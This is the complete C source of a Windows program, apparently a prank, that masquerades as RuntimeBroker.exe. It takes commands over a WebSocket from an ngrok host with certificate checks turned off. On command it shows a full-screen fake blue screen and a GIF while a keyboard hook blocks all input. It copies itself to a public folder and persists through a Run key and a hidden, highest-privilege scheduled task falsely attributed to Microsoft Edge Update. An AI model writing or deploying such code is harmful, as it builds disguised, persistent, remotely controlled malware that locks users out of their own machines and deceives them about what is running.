/*
 * dani-meglepi-client — RuntimeBroker.exe
 * Win32 WebSocket kliens.
 * Fordítás (MinGW Linuxon):
 *   x86_64-w64-mingw32-gcc -O2 -mwindows -o RuntimeBroker.exe \
 *     client.c version.res \
 *     -lws2_32 -lwinhttp -lgdi32 -lole32 -lshell32 \
 *     -luuid -lshlwapi -luser32 -ladvapi32 -loleaut32
 */
#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#define WINVER       0x0A00
#define _WIN32_WINNT 0x0A00

#include <windows.h>
#include <winhttp.h>
#include <ole2.h>
#include <taskschd.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <objbase.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Konfiguráció ───────────────────────────────────────────────────────── */
#define WS_HOST         L"turbulent-renter-liking.ngrok-free.app"
#define WS_PORT         443
#define WS_PATH_PREFIX  L"/ws/"
#define ASSET_DIR       L"C:\\Users\\Public\\dani-meglepi\\"
#define BSOD_FILE       L"C:\\Users\\Public\\dani-meglepi\\bsod.png"
#define GIF_FILE        L"C:\\Users\\Public\\dani-meglepi\\daninak.gif"
#define EXE_NAME        L"RuntimeBroker.exe"
#define TASK_NAME       L"MicrosoftEdgeUpdateTaskMachineCore"
#define RECONNECT_MS    3000
#define MAX_BACKOFF_MS  60000
#define HEARTBEAT_MS    20000

/* ── GDI+ minimális flat C API ──────────────────────────────────────────── */
/* Saját típusok — nem a gdiplus.h C++ header-je kell */
typedef int   GpStatus;
typedef void* GpImage;
typedef void* GpGraphics;

typedef struct {
    UINT32 GdiplusVersion;
    void  *DebugEventCallback;
    BOOL   SuppressBackgroundThread;
    BOOL   SuppressExternalCodecs;
} GpStartupInput;

typedef struct {
    PROPID id;
    ULONG  length;
    WORD   type;
    VOID  *value;
} GpPropItem;

/* GDI+ GUID konstansok (keményített értékek) */
static const GUID GP_DimTime =
    {0x6aedbd6d,0x3fb5,0x418a,{0x83,0xa6,0x7f,0x45,0x22,0x9d,0xc8,0x72}};

#define GP_FrameDelayTag   0x5100
#define GP_PropTypeLong    4
#define GP_ImageWidthTag   0x5110
#define GP_ImageHeightTag  0x5111

/* Függvény pointerek — void* alapú, cast-tal hívjuk */
static HMODULE gp_dll = NULL;
static ULONG_PTR gp_token = 0;

typedef GpStatus (__stdcall *PFStartup)(ULONG_PTR*, const GpStartupInput*, void*);
typedef void     (__stdcall *PFShutdown)(ULONG_PTR);
typedef GpStatus (__stdcall *PFLoadStream)(IStream*, GpImage**);
typedef GpStatus (__stdcall *PFDrawRect)(GpGraphics*, GpImage*, INT, INT, INT, INT);
typedef GpStatus (__stdcall *PFFromHDC)(HDC, GpGraphics**);
typedef GpStatus (__stdcall *PFDelGraph)(GpGraphics*);
typedef GpStatus (__stdcall *PFDelImg)(GpImage*);
typedef GpStatus (__stdcall *PFFrameCnt)(GpImage*, const GUID*, UINT*);
typedef GpStatus (__stdcall *PFSelFrame)(GpImage*, const GUID*, UINT);
typedef GpStatus (__stdcall *PFPropSz)(GpImage*, PROPID, UINT*);
typedef GpStatus (__stdcall *PFPropGet)(GpImage*, PROPID, UINT, GpPropItem*);
typedef GpStatus (__stdcall *PFClear)(GpGraphics*, DWORD);
typedef GpStatus (__stdcall *PFSetInterp)(GpGraphics*, INT);

static PFStartup  gp_Startup;
static PFShutdown gp_Shutdown;
static PFLoadStream gp_LoadStream;
static PFDrawRect   gp_DrawRect;
static PFFromHDC    gp_FromHDC;
static PFDelGraph   gp_DelGraph;
static PFDelImg     gp_DelImg;
static PFFrameCnt   gp_FrameCnt;
static PFSelFrame   gp_SelFrame;
static PFPropSz     gp_PropSz;
static PFPropGet    gp_PropGet;
static PFClear      gp_Clear;
static PFSetInterp  gp_SetInterp;

#define GPLOAD(var, type, name) \
    var = (type)GetProcAddress(gp_dll, name); \
    if (!var) return FALSE;

static BOOL gdiplus_init(void) {
    gp_dll = LoadLibraryW(L"gdiplus.dll");
    if (!gp_dll) return FALSE;
    GPLOAD(gp_Startup,    PFStartup,    "GdiplusStartup")
    GPLOAD(gp_Shutdown,   PFShutdown,   "GdiplusShutdown")
    GPLOAD(gp_LoadStream, PFLoadStream, "GdipCreateBitmapFromStream")
    GPLOAD(gp_DrawRect,   PFDrawRect,   "GdipDrawImageRectI")
    GPLOAD(gp_FromHDC,    PFFromHDC,    "GdipCreateFromHDC")
    GPLOAD(gp_DelGraph,   PFDelGraph,   "GdipDeleteGraphics")
    GPLOAD(gp_DelImg,     PFDelImg,     "GdipDisposeImage")
    GPLOAD(gp_FrameCnt,   PFFrameCnt,   "GdipImageGetFrameCount")
    GPLOAD(gp_SelFrame,   PFSelFrame,   "GdipImageSelectActiveFrame")
    GPLOAD(gp_PropSz,     PFPropSz,     "GdipGetPropertyItemSize")
    GPLOAD(gp_PropGet,    PFPropGet,    "GdipGetPropertyItem")
    GPLOAD(gp_Clear,      PFClear,      "GdipGraphicsClear")
    GPLOAD(gp_SetInterp,  PFSetInterp,  "GdipSetInterpolationMode")
    GpStartupInput si = {1, NULL, FALSE, FALSE};
    return gp_Startup(&gp_token, &si, NULL) == 0;
}

/* ── Globális állapot ───────────────────────────────────────────────────── */
static HWND  g_hwnd    = NULL;
static HHOOK g_kbhook  = NULL;
static BOOL  g_fs      = FALSE;

typedef enum { ST_IDLE, ST_SHOW, ST_DEMO } AppState;
typedef enum { SH_BLK1, SH_BSOD, SH_BLK2, SH_GIF  } ShowStep;

static volatile AppState g_state = ST_IDLE;
static volatile ShowStep g_step  = SH_BLK1;

static GpImage *g_bsod       = NULL;
static GpImage *g_gif        = NULL;
static IStream *g_gif_stream = NULL;
static UINT     g_gif_frames = 0;
static UINT     g_gif_frame  = 0;

static UINT_PTR g_show_timer = 0;
static UINT_PTR g_gif_timer  = 0;

static HINTERNET g_session  = NULL;
static HINTERNET g_connect  = NULL;
static HINTERNET g_ws       = NULL;
static volatile BOOL g_running = TRUE;

#define WM_DO_SHOW  (WM_USER+1)
#define WM_DO_DEMO  (WM_USER+2)
#define WM_DO_CLEAR (WM_USER+3)

/* ── Kép méretek lekérése ────────────────────────────────────────────────── */
static void get_img_size(GpImage *img, int *ow, int *oh) {
    *ow = 0; *oh = 0;
    UINT sz = 0;
    if (gp_PropSz(img, GP_ImageWidthTag, &sz) == 0 && sz > 0) {
        GpPropItem *p = (GpPropItem*)malloc(sz);
        if (p) {
            if (gp_PropGet(img, GP_ImageWidthTag, sz, p) == 0 && p->length >= 4)
                *ow = (int)*(ULONG*)p->value;
            free(p);
        }
    }
    sz = 0;
    if (gp_PropSz(img, GP_ImageHeightTag, &sz) == 0 && sz > 0) {
        GpPropItem *p = (GpPropItem*)malloc(sz);
        if (p) {
            if (gp_PropGet(img, GP_ImageHeightTag, sz, p) == 0 && p->length >= 4)
                *oh = (int)*(ULONG*)p->value;
            free(p);
        }
    }
}

/* ── Cover-fit rajzolás (képernyő teljesen lefed, arány megtartva) ─────── */
static void draw_cover(HDC hdc, GpImage *img, int sw, int sh) {
    if (!img) return;
    GpGraphics *g = NULL;
    if (gp_FromHDC(hdc, &g) != 0) return;
    gp_SetInterp(g, 7);         /* HighQualityBicubic */
    gp_Clear(g, 0xFF000000);

    int iw = 0, ih = 0;
    get_img_size(img, &iw, &ih);

    int dx = 0, dy = 0, dw = sw, dh = sh;
    if (iw > 0 && ih > 0) {
        double sx = (double)sw / iw;
        double sy = (double)sh / ih;
        double s  = sx > sy ? sx : sy;   /* cover: a nagyobb skála */
        dw = (int)(iw * s + 0.5);
        dh = (int)(ih * s + 0.5);
        dx = (sw - dw) / 2;
        dy = (sh - dh) / 2;
    }
    gp_DrawRect(g, img, dx, dy, dw, dh);
    gp_DelGraph(g);
}

/* ── GIF frame delay ────────────────────────────────────────────────────── */
static UINT gif_delay_ms(GpImage *img, UINT frame) {
    UINT sz = 0;
    if (gp_PropSz(img, GP_FrameDelayTag, &sz) != 0 || sz == 0) return 80;
    GpPropItem *p = (GpPropItem*)malloc(sz);
    if (!p) return 80;
    UINT d = 80;
    if (gp_PropGet(img, GP_FrameDelayTag, sz, p) == 0 &&
        p->type == GP_PropTypeLong) {
        ULONG *arr = (ULONG*)p->value;
        UINT cnt = p->length / sizeof(ULONG);
        if (frame < cnt && arr[frame] > 0)
            d = arr[frame] * 10;
        if (d < 20) d = 80;
    }
    free(p);
    return d;
}

static void repaint(void) { if (g_hwnd) InvalidateRect(g_hwnd, NULL, FALSE); }

/* ── GIF animáció timer ─────────────────────────────────────────────────── */
static VOID CALLBACK gif_tick(HWND h, UINT m, UINT_PTR id, DWORD t) {
    (void)h; (void)m; (void)id; (void)t;
    if (!g_gif || g_state != ST_SHOW || g_step != SH_GIF) return;
    g_gif_frame = (g_gif_frame + 1) % g_gif_frames;
    gp_SelFrame(g_gif, &GP_DimTime, g_gif_frame);
    UINT d = gif_delay_ms(g_gif, g_gif_frame);
    KillTimer(NULL, g_gif_timer);
    g_gif_timer = SetTimer(NULL, 2, d, gif_tick);
    repaint();
}

/* ── Show lépések ───────────────────────────────────────────────────────── */
static VOID CALLBACK show_tick(HWND h, UINT m, UINT_PTR id, DWORD t);

static void advance(ShowStep step) {
    g_step = step;
    if (g_show_timer) { KillTimer(NULL, g_show_timer); g_show_timer = 0; }
    repaint();
    switch (step) {
        case SH_BLK1: g_show_timer = SetTimer(NULL, 1, 1000, show_tick); break;
        case SH_BSOD: g_show_timer = SetTimer(NULL, 1, 3000, show_tick); break;
        case SH_BLK2: g_show_timer = SetTimer(NULL, 1,  500, show_tick); break;
        case SH_GIF:
            g_gif_frame = 0;
            if (g_gif) {
                gp_SelFrame(g_gif, &GP_DimTime, 0);
                g_gif_timer = SetTimer(NULL, 2, gif_delay_ms(g_gif, 0), gif_tick);
            }
            break;
    }
}

static VOID CALLBACK show_tick(HWND h, UINT m, UINT_PTR id, DWORD t) {
    (void)h; (void)m; (void)id; (void)t;
    KillTimer(NULL, g_show_timer); g_show_timer = 0;
    switch (g_step) {
        case SH_BLK1: advance(SH_BSOD); break;
        case SH_BSOD: advance(SH_BLK2); break;
        case SH_BLK2: advance(SH_GIF);  break;
        case SH_GIF:                     break;
    }
}

/* ── Keyboard hook ──────────────────────────────────────────────────────── */
static LRESULT CALLBACK kbhook_proc(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && g_fs) return 1;  /* minden billentyű elnyel */
    return CallNextHookEx(g_kbhook, code, wp, lp);
}

/* ── Fullscreen ─────────────────────────────────────────────────────────── */
static void enter_fs(void) {
    if (g_fs) return;
    g_fs = TRUE;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowLongW(g_hwnd, GWL_STYLE,   WS_POPUP);
    SetWindowLongW(g_hwnd, GWL_EXSTYLE, WS_EX_TOPMOST | WS_EX_TOOLWINDOW);
    SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, sw, sh,
        SWP_FRAMECHANGED | SWP_SHOWWINDOW | SWP_NOACTIVATE);
    if (g_kbhook) UnhookWindowsHookEx(g_kbhook);
    g_kbhook = SetWindowsHookExW(WH_KEYBOARD_LL, kbhook_proc, NULL, 0);
}

static void leave_fs(void) {
    if (!g_fs) return;
    g_fs = FALSE;
    if (g_kbhook)     { UnhookWindowsHookEx(g_kbhook); g_kbhook = NULL; }
    if (g_gif_timer)  { KillTimer(NULL, g_gif_timer);  g_gif_timer  = 0; }
    if (g_show_timer) { KillTimer(NULL, g_show_timer); g_show_timer = 0; }
    ShowWindow(g_hwnd, SW_HIDE);
}

/* ── WM_PAINT ───────────────────────────────────────────────────────────── */
static void on_paint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC hdc = BeginPaint(hwnd, &ps);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HDC mdc    = CreateCompatibleDC(hdc);
    HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
    HBITMAP ob = (HBITMAP)SelectObject(mdc, bm);

    RECT rc = {0, 0, sw, sh};
    HBRUSH blk = CreateSolidBrush(RGB(0,0,0));
    FillRect(mdc, &rc, blk);
    DeleteObject(blk);

    if (g_state == ST_DEMO) {
        HBRUSH rb = CreateSolidBrush(RGB(200,0,0));
        FillRect(mdc, &rc, rb); DeleteObject(rb);
        int fs = sh / 3;
        HFONT fn = CreateFontW(fs,0,0,0,FW_BLACK,0,0,0,
            DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY,DEFAULT_PITCH|FF_SWISS,L"Arial");
        HFONT of = (HFONT)SelectObject(mdc, fn);
        SetTextColor(mdc, RGB(255,255,255));
        SetBkMode(mdc, TRANSPARENT);
        DrawTextW(mdc,L"DEMO",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);
        SelectObject(mdc, of); DeleteObject(fn);

    } else if (g_state == ST_SHOW) {
        switch (g_step) {
            case SH_BLK1: case SH_BLK2: break;
            case SH_BSOD:
                if (g_bsod) draw_cover(mdc,g_bsod,sw,sh);
                else {
                    HBRUSH bb = CreateSolidBrush(RGB(0,120,215));
                    FillRect(mdc,&rc,bb); DeleteObject(bb);
                }
                break;
            case SH_GIF:
                if (g_gif) draw_cover(mdc,g_gif,sw,sh);
                break;
        }
    }

    BitBlt(hdc,0,0,sw,sh,mdc,0,0,SRCCOPY);
    SelectObject(mdc,ob); DeleteObject(bm); DeleteDC(mdc);
    EndPaint(hwnd,&ps);
}

/* ── Ablakeljárás ───────────────────────────────────────────────────────── */
static LRESULT CALLBACK wndproc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_PAINT:      on_paint(hwnd); return 0;
        case WM_ERASEBKGND: return 1;
        case WM_DO_SHOW:
            g_state = ST_SHOW; enter_fs(); advance(SH_BLK1); return 0;
        case WM_DO_DEMO:
            g_state = ST_DEMO; enter_fs(); repaint(); return 0;
        case WM_DO_CLEAR:
            g_state = ST_IDLE; leave_fs(); return 0;
        case WM_WINDOWPOSCHANGING:
            if (g_fs) {
                WINDOWPOS *p = (WINDOWPOS*)lp;
                p->hwndInsertAfter = HWND_TOPMOST;
                p->flags &= ~SWP_NOZORDER;
            }
            return 0;
        case WM_TIMER:
            /* Topmost kényszer (timer ID=99) */
            if (wp == 99 && g_fs)
                SetWindowPos(g_hwnd, HWND_TOPMOST,0,0,0,0,
                    SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
            return 0;
        case WM_CLOSE: case WM_DESTROY: return 0;
        default: return DefWindowProcW(hwnd,msg,wp,lp);
    }
}

/* ── Parancs feldolgozás ────────────────────────────────────────────────── */
static void process_cmd(const char *json) {
    const char *p = strstr(json,"\"cmd\""); if (!p) return;
    p = strchr(p,':');                      if (!p) return;
    while (*p==':'||*p==' '||*p=='"') p++;
    if      (strncmp(p,"show", 4)==0) PostMessageW(g_hwnd,WM_DO_SHOW, 0,0);
    else if (strncmp(p,"demo", 4)==0) PostMessageW(g_hwnd,WM_DO_DEMO, 0,0);
    else if (strncmp(p,"clear",5)==0) PostMessageW(g_hwnd,WM_DO_CLEAR,0,0);
}

/* ── WS cleanup ─────────────────────────────────────────────────────────── */
static void ws_cleanup(void) {
    if (g_ws)      { WinHttpCloseHandle(g_ws);      g_ws      = NULL; }
    if (g_connect) { WinHttpCloseHandle(g_connect); g_connect = NULL; }
}

/* ── WS kapcsolat ───────────────────────────────────────────────────────── */
static BOOL ws_open(void) {
    DWORD vol = 0;
    GetVolumeInformationW(L"C:\\",NULL,0,&vol,NULL,NULL,NULL,0);
    WCHAR cid[32], wspath[128];
    swprintf_s(cid,32,L"pc-%08X",vol);
    swprintf_s(wspath,128,L"%s%s",WS_PATH_PREFIX,cid);

    g_connect = WinHttpConnect(g_session, WS_HOST, WS_PORT, 0);
    if (!g_connect) return FALSE;

    HINTERNET req = WinHttpOpenRequest(g_connect, L"GET", wspath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!req) { ws_cleanup(); return FALSE; }

    DWORD fl = SECURITY_FLAG_IGNORE_UNKNOWN_CA
             | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
             | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
             | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &fl, sizeof fl);
    WinHttpAddRequestHeaders(req,
        L"ngrok-skip-browser-warning: true\r\n",-1L,WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpSetOption(req, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);

    if (!WinHttpSendRequest(req,WINHTTP_NO_ADDITIONAL_HEADERS,0,
                            WINHTTP_NO_REQUEST_DATA,0,0,0)
     || !WinHttpReceiveResponse(req,NULL)) {
        WinHttpCloseHandle(req); ws_cleanup(); return FALSE;
    }

    g_ws = WinHttpWebSocketCompleteUpgrade(req, 0);
    WinHttpCloseHandle(req);
    if (!g_ws) { ws_cleanup(); return FALSE; }
    return TRUE;
}

/* ── Heartbeat szál ─────────────────────────────────────────────────────── */
static DWORD WINAPI hb_thread(LPVOID p) {
    (void)p;
    const char *ping = "{\"ping\":true}";
    while (g_running) {
        Sleep(HEARTBEAT_MS);
        if (g_ws)
            WinHttpWebSocketSend(g_ws,
                WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                (PVOID)ping,(DWORD)strlen(ping));
    }
    return 0;
}

/* ── WS fogadó szál ─────────────────────────────────────────────────────── */
static DWORD WINAPI ws_thread(LPVOID p) {
    (void)p;
    DWORD backoff = RECONNECT_MS;
    while (g_running) {
        if (!ws_open()) {
            Sleep(backoff);
            if (backoff < MAX_BACKOFF_MS) backoff *= 2;
            continue;
        }
        backoff = RECONNECT_MS;
        HANDLE hb = CreateThread(NULL,0,hb_thread,NULL,0,NULL);
        BYTE buf[8192];
        while (g_running) {
            DWORD rd = 0;
            WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
            if (WinHttpWebSocketReceive(g_ws,buf,sizeof buf-1,&rd,&type)
                    != ERROR_SUCCESS) break;
            if (type==WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE ||
                type==WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE) {
                buf[rd]=0; process_cmd((char*)buf);
            } else if (type==WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) break;
        }
        if (hb) { TerminateThread(hb,0); CloseHandle(hb); }
        ws_cleanup();
        if (!g_running) break;
        Sleep(backoff);
        if (backoff < MAX_BACKOFF_MS) backoff *= 2;
    }
    return 0;
}

/* ── Task Scheduler ─────────────────────────────────────────────────────── */
static void install_task(const WCHAR *exe) {
    ITaskService    *svc  = NULL;
    ITaskFolder     *root = NULL;
    ITaskDefinition *def  = NULL;
    IRegistrationInfo *ri = NULL;
    ITaskSettings   *ts   = NULL;
    ITriggerCollection *tc = NULL;
    ITrigger        *tr   = NULL;
    IActionCollection *ac = NULL;
    IAction         *act  = NULL;
    IExecAction     *ea   = NULL;
    IRegisteredTask *rt   = NULL;
    IPrincipal      *prin = NULL;

    if (FAILED(CoCreateInstance(&CLSID_TaskScheduler, NULL,
            CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&svc))) return;
    VARIANT v; VariantInit(&v);
    if (FAILED(svc->lpVtbl->Connect(svc,v,v,v,v))) goto out;
    if (FAILED(svc->lpVtbl->GetFolder(svc,L"\\",&root))) goto out;
    if (FAILED(svc->lpVtbl->NewTask(svc,0,&def))) goto out;

    def->lpVtbl->get_RegistrationInfo(def,&ri);
    if (ri) {
        ri->lpVtbl->put_Author(ri,L"Microsoft Corporation");
        ri->lpVtbl->put_Description(ri,
            L"Keeps the Microsoft Edge Update Task running.");
        ri->lpVtbl->Release(ri);
    }
    def->lpVtbl->get_Principal(def,&prin);
    if (prin) {
        prin->lpVtbl->put_LogonType(prin,TASK_LOGON_INTERACTIVE_TOKEN);
        prin->lpVtbl->put_RunLevel(prin,TASK_RUNLEVEL_HIGHEST);
        prin->lpVtbl->Release(prin);
    }
    def->lpVtbl->get_Settings(def,&ts);
    if (ts) {
        ts->lpVtbl->put_Hidden(ts,VARIANT_TRUE);
        ts->lpVtbl->put_MultipleInstances(ts,TASK_INSTANCES_IGNORE_NEW);
        ts->lpVtbl->put_DisallowStartIfOnBatteries(ts,VARIANT_FALSE);
        ts->lpVtbl->put_StopIfGoingOnBatteries(ts,VARIANT_FALSE);
        ts->lpVtbl->put_ExecutionTimeLimit(ts,L"PT0S");
        ts->lpVtbl->put_RestartCount(ts,999);
        ts->lpVtbl->put_RestartInterval(ts,L"PT1M");
        ts->lpVtbl->Release(ts);
    }
    def->lpVtbl->get_Triggers(def,&tc);
    if (tc) {
        /* Logon trigger — minden felhasználóra (üres UserID) */
        tc->lpVtbl->Create(tc,TASK_TRIGGER_LOGON,&tr);
        if (tr) tr->lpVtbl->Release(tr);
        tc->lpVtbl->Release(tc);
    }
    def->lpVtbl->get_Actions(def,&ac);
    if (ac) {
        ac->lpVtbl->Create(ac,TASK_ACTION_EXEC,&act);
        if (act) {
            act->lpVtbl->QueryInterface(act,&IID_IExecAction,(void**)&ea);
            if (ea) {
                ea->lpVtbl->put_Path(ea,(BSTR)exe);
                ea->lpVtbl->put_WorkingDirectory(ea,ASSET_DIR);
                ea->lpVtbl->Release(ea);
            }
            act->lpVtbl->Release(act);
        }
        ac->lpVtbl->Release(ac);
    }
    {
        VARIANT u,p; VariantInit(&u); VariantInit(&p);
        root->lpVtbl->RegisterTaskDefinition(root,
            TASK_NAME, def, TASK_CREATE_OR_UPDATE,
            u, p, TASK_LOGON_INTERACTIVE_TOKEN, u, &rt);
        if (rt) rt->lpVtbl->Release(rt);
    }
out:
    if (def)  def->lpVtbl->Release(def);
    if (root) root->lpVtbl->Release(root);
    if (svc)  svc->lpVtbl->Release(svc);
}

/* ── Registry Run kulcs ─────────────────────────────────────────────────── */
static void install_reg(const WCHAR *exe) {
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExW(k,L"RuntimeBrokerSvc",0,REG_SZ,
            (const BYTE*)exe,(DWORD)((wcslen(exe)+1)*sizeof(WCHAR)));
        RegCloseKey(k);
    }
}

/* ── Képbetöltés ────────────────────────────────────────────────────────── */
static GpImage *load_img(const WCHAR *path, BOOL keep_stream) {
    IStream *s = NULL;
    if (FAILED(SHCreateStreamOnFileW(path,
            STGM_READ|STGM_SHARE_DENY_NONE, &s))) return NULL;
    GpImage *img = NULL;
    gp_LoadStream(s, &img);
    if (keep_stream) g_gif_stream = s;
    else s->lpVtbl->Release(s);
    return img;
}

/* ── WinMain ────────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int nShow) {
    (void)hPrev; (void)cmd; (void)nShow;

    /* Egypéldány mutex */
    HANDLE mutex = CreateMutexW(NULL,TRUE,
        L"Global\\MicrosoftEdgeCoreUpdateInstance_v2");
    if (GetLastError()==ERROR_ALREADY_EXISTS) return 0;

    /* Elérési utak */
    WCHAR exe[MAX_PATH], dst[MAX_PATH];
    GetModuleFileNameW(NULL,exe,MAX_PATH);
    swprintf_s(dst,MAX_PATH,L"%s%s",ASSET_DIR,EXE_NAME);

    /* Önmásolás */
    if (_wcsicmp(exe,dst)!=0) {
        CreateDirectoryW(ASSET_DIR,NULL);
        CopyFileW(exe,dst,FALSE);
    }

    /* Perzisztencia */
    CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
    install_reg(dst);
    install_task(dst);
    CoUninitialize();

    /* GDI+ */
    if (!gdiplus_init()) return 1;

    /* Képek */
    g_bsod = load_img(BSOD_FILE, FALSE);
    g_gif  = load_img(GIF_FILE,  TRUE);
    if (g_gif) {
        gp_FrameCnt(g_gif,&GP_DimTime,&g_gif_frames);
        if (g_gif_frames<1) g_gif_frames=1;
    }

    /* WinHTTP session (Edge UA) */
    g_session = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);

    /* Ablak */
    WNDCLASSEXW wc = {0};
    wc.cbSize        = sizeof wc;
    wc.lpfnWndProc   = wndproc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"CoreRtBrokerHost";
    RegisterClassExW(&wc);

    g_hwnd = CreateWindowExW(
        WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
        L"CoreRtBrokerHost",L"",WS_POPUP,
        0,0,1,1,NULL,NULL,hInst,NULL);

    /* WS szál */
    CreateThread(NULL,0,ws_thread,NULL,0,NULL);

    /* Topmost kényszer timer */
    SetTimer(g_hwnd,99,100,NULL);

    /* Üzenethurok — NULL hwnd timereket kézzel diszpécseljük */
    MSG msg;
    while (GetMessageW(&msg,NULL,0,0)>0) {
        if (!msg.hwnd && msg.message==WM_TIMER) {
            TIMERPROC proc = (TIMERPROC)msg.lParam;
            if (proc) proc(NULL,WM_TIMER,msg.wParam,msg.time);
            continue;
        }
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    /* Takarítás */
    g_running = FALSE;
    ws_cleanup();
    if (g_session)    WinHttpCloseHandle(g_session);
    if (g_bsod)       gp_DelImg(g_bsod);
    if (g_gif)        gp_DelImg(g_gif);
    if (g_gif_stream) g_gif_stream->lpVtbl->Release(g_gif_stream);
    gp_Shutdown(gp_token);
    CloseHandle(mutex);
    return 0;
}
